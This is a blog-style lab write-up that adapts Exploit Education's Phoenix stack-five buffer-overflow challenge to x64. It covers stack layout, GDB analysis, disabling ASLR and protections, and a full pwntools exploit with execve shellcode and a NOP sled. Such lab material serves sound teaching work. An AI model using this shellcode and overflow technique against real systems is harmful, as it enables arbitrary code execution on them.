---
layout: post
title: "Adapting Phoenix/Stack-Five x86 -> x64"
date: 2026-07-09
tags: [exploitation]
---

The Phoenix series by [Exploit Education](https://exploit.education) is an excellent introduction to memory corruption. However, the primary challenge in my opinion, **stack-five**, can be an even more educational experience if we adapt it to an x64 architecture.

## **Introduction**

The purpose of this article is to illustrate the important points of memory corruption exploitation on the stack. 

What will this article cover:
  - **What is "the stack"**
  - **Hijacking control flow**
  - **Introducing The Challenge**
  - **Buffer Overflow**
  - **Finding an address with `GDB`**
  - **Using `pwntools` to write an exploit**

## **What is "the stack"**

A `stack` is a linear structure for data. Like a physical stack of plates, the `stack` follows a Last in, First Out (LIFO) principle: You can only place a new plate on the very top, and when you need to take a plate, you must remove the one from the top first.

```
                    |                    | <-- New plate
   Top of stack --> |====================| <-- Plate to be removed
                    |====================|
                ^   |====================|
                |   |====================|
  grows upwards |   |====================|             
```

On `remove()` operations the topmost plate will be removed, and on `add()` operations a plate will be pushed on top of the current topmost plate. In the context of a stack, these operations are usually called `pop` for removal and `push` for addition.

For our purposes, we're interested in a specific stack called the `call stack`. The `call stack` is used by programs to track function calls and direct **control flow**. It essentially acts like a todo-list for the program and exploitation of the stack centers around redirecting that execution into arbitrary instructions.

In order to understand memory corruption we'll need to understand the layout of the memory in the process we plan to corrupt. 

```
    [  STACK ] <== Stack grows downward
    [        ]
    [  HEAP  ] <== Heap grows upward
    [  BSS   ] <== Uninitialized Data
    [  DATA  ] <== Initialized Variables
    [  TEXT  ] <== Binary Image
```

The key takeaway is that in this case the `stack` grows downwards in the `call stack` meaning that when reasoning about the `call stack` we must use a flipped model relative to a regular stack.

```
grows downwards |   |====================| 
                |   |====================| 
                V   |====================|
                    |====================|
   Top of stack --> |====================| <-- Plate to be removed
                    |                    | <-- New plate            
```

## **Hijacking control flow**

In order to hijack control flow we'll need to understand two things: **A)** How does the `call stack` direct control flow and **B)** The anatomy of the `call stack`

### **How does the `call stack` direct control flow?**

When a function is called, the operating system creates a stack frame containing the function arguments, local variables for the function to use and crucially an address in memory for the function to return to after completion called the `return address`. Normally, the `return address` specifies the memory address directly after the call to the child function from the parent function but by corrupting this value, the attacker can hijack control flow.

```
    PARENT          ┏━━>    CHILD
    CALL CHILD    ━━┛       DO SOMETHING
    NOP       <===========  RETURN
```

A  function call looks something like this. The parent function calls the child function which does something and then follows the `return address` back to the parent function.

```
    PARENT          ┏━━>    CHILD
    CALL CHILD    ━━┛       DO SOMETHING
    NOP                     RETURN        =========>  Corrupted Address
```

However, if the `return address` is corrupted then when the child function attempts to return control flow to the parent function control flow is actually redirected to the address dictated by the corrupted `return address`.

### **The anatomy of the `call stack`**

The base of the `call stack` is managed by a register called `RBP`. Registers essentially act like variables and the `RBP` register is used to keep track of the base of the `call stack`. The top of the `call stack` is managed by a register called `RSP`. The diagram below illustrates this point a little more clearly.

```
            |====================| <-- RBP
            |====================| 
            |====================|
            |====================|
            |====================| <-- RSP
            |                    | <-- New plate
```

The important thing to know about the `call stack` layout is that the contents of the stack are what we can influence and directly above the `RBP` pointer is the `return address`. 

```
            |====================| < RBP+8 Return Address
            |====================| < RBP
            |====================| < RBP-8 Local Variable
            |====================| < RBP-16 Local Variable
            |====================| < RBP-24 Local Variable
```

## **Introducing The Challenge**

```c
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define LEVELNAME "Stack Five"
#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```
```bash
gcc -fno-stack-protector -z execstack -no-pie -o stack-five stack-five.c
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space # Change back to 2 after
```

Our goal is to spawn a shell. If you haven't tried already, I'd suggest giving this challenge a try by yourself first.

## **Buffer Overflow**

The vulnerable function of the exercise is `gets()`. This function is inherently dangerous because it performs no bounds checking. It reads input from stdin until a newline or EOF is encountered. This means that we can create an input with an arbitrary length to clobber other values.

We'll use this vulnerability to insert instructions to spawn a shell into the buffer and corrupt the `return address` to point back to the shellcode.

## **Finding an address with `GDB`**

In order to redirect execution properly we first have to find the address of the buffer in memory. 

```
┌──(kali㉿kali)-[~]
└─$ gdb -q ./stack-five 
Reading symbols from ./stack-five...
(No debugging symbols found in ./stack-five)
(gdb) set exec-wrapper env -i
(gdb) break gets
Breakpoint 1 at 0x401040
(gdb) r
Starting program: /home/kali/stack-five 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to Stack Five, brought to you by https://exploit.education

Breakpoint 1, 0x00007ffff7e2f450 in gets ()
   from /usr/lib/x86_64-linux-gnu/libc.so.6
(gdb) p/x $rdi
$1 = 0x7fffffffec60
(gdb) 
```

The `RDI` register is the first argument register under System V calling conventions. The first argument of the `gets()` holds an address to the buffer. By setting a breakpoint at the `gets()` function, we can look at the value held in the `RDI` register in order to determine the address of the buffer in memory so we can overwrite the `return address` with the correct value.

We also need to find the offset for the buffer overflow.

```
(gdb) disas start_level
Dump of assembler code for function start_level:
   0x0000000000401136 <+0>:     push   rbp
   0x0000000000401137 <+1>:     mov    rbp,rsp
   0x000000000040113a <+4>:     add    rsp,0xffffffffffffff80
   0x000000000040113e <+8>:     lea    rax,[rbp-0x80]
   0x0000000000401142 <+12>:    mov    rdi,rax
   0x0000000000401145 <+15>:    call   0x401040 <gets@plt>
   0x000000000040114a <+20>:    nop
   0x000000000040114b <+21>:    leave
   0x000000000040114c <+22>:    ret
End of assembler dump.
(gdb) 
```

The disassembly reveals that the buffer is loaded from 128 bytes below the `RBP` pointer and we know that the return address is 8 bytes above the `RBP` pointer. Therefore adding these together, `128 + 8 = 136`, gives us an offset of 136 bytes for our payload.

That's essentially all we need in order to build an exploit for this level

## **Using pwntools to write an exploit**

In order to avoid unneccesary we'll use the `pwntools` module to help us out. 

```python
from pwn import *
import struct
context.arch = 'amd64'

sc  = b"\x48\x81\xec\x00\x01\x00\x00" + \
      b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
off = 136
ret = 0x7fffffffec60 + 56          # 0x7fffffffec98, mid-sled

payload = b"\x90"*(off-len(sc)) + sc + struct.pack("<Q", ret)
p = process(['/home/kali/stack-five'], env={})   # env -i + full-path argv[0]
p.sendline(payload)
p.interactive()
```

### **The first section just handles imports and setup**

```python
from pwn import *
import struct
context.arch = 'amd64'
```

### **The second section handles the definition of important variables for the exploit**

```python
sc  = b"\x48\x81\xec\x00\x01\x00\x00" + \
      b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
off = 136
ret = 0x7fffffffec60 + 56          # 0x7fffffffec98, mid-sled
```

The first variable is the shellcode, split into two parts: moving the stack down so upcoming pushes land on the stack to prevent illegal instructions, and the actual instructions to spawn the shell.

#### **Part 1 - stack fixup**
 
| Bytes | Instruction | Effect |
|---|---|---|
| `48 81 ec 00 01 00 00` | `sub rsp, 0x100` | Drop `rsp` 256 bytes below the shellcode so the upcoming pushes don't clobber unrun code (avoids SIGILL). |
 
#### **Part 2 - execve("/bin//sh", NULL, NULL)**
 
| Bytes | Instruction | Effect |
|---|---|---|
| `48 31 f6` | `xor rsi, rsi` | `rsi = 0` => argv = NULL, also serves as the string terminator |
| `56` | `push rsi` | Push a NULL to terminate `"/bin//sh"` on the stack |
| `48 bf 2f 62 69 6e 2f 2f 73 68` | `movabs rdi, "/bin//sh"` | Load 8 ASCII bytes; the `//` is padding to make exactly 8 (kernel treats `//` as `/`) |
| `57` | `push rdi` | Write `"/bin//sh"` onto the stack |
| `54` | `push rsp` | Push a pointer to that string |
| `5f` | `pop rdi` | `rdi` -> `"/bin//sh"` (execve arg 1, the path) |
| `6a 3b` | `push 0x3b` | The execve syscall number |
| `58` | `pop rax` | `rax = 0x3b` (selects execve) |
| `99` | `cdq` | `rdx = 0` (envp = NULL) — cheap way to zero `rdx` |
| `0f 05` | `syscall` | `execve("/bin//sh", NULL, NULL)` -> shell |

The second variable is the total offset for the payload and the third variable is the `return address` + 56 so that it lands within a `NOP Sled`, which is a technique to improve the reliability of the exploit. 

### **The third section handles payload assembly and delivery**

```python
payload = b"\x90"*(off-len(sc)) + sc + struct.pack("<Q", ret)
p = process(['/home/kali/stack-five'], env={})   # env -i + full-path argv[0]
p.sendline(payload)
p.interactive()
```

`0x90` is `NOP` so we'll create the `NOP Sled` by computing the offset minus the length of the shellcode and creating that many `NOP` instructions. After creating the `NOP Sled`, we'll append the shellcode to the `NOP Sled` so any return landing in the `NOP Sled` will slide into the shellcode. Finally, we'll append the `return address` variable at the end to overwrite the program's return address. The last three operations open a process in the same way that `GDB` would, sends the payload and hands the shell over. 

## Conclusion

The exploit follows the following structure

```
                    [NOP-Sled 106-bytes] -> [Shellcode 30 bytes] [Hijacked Ret]
                    ^                                                         |
                    |_________________________________________________________| 
```

We hijacked the return address so instead of returning to the caller function, the program executes our arbitrary code.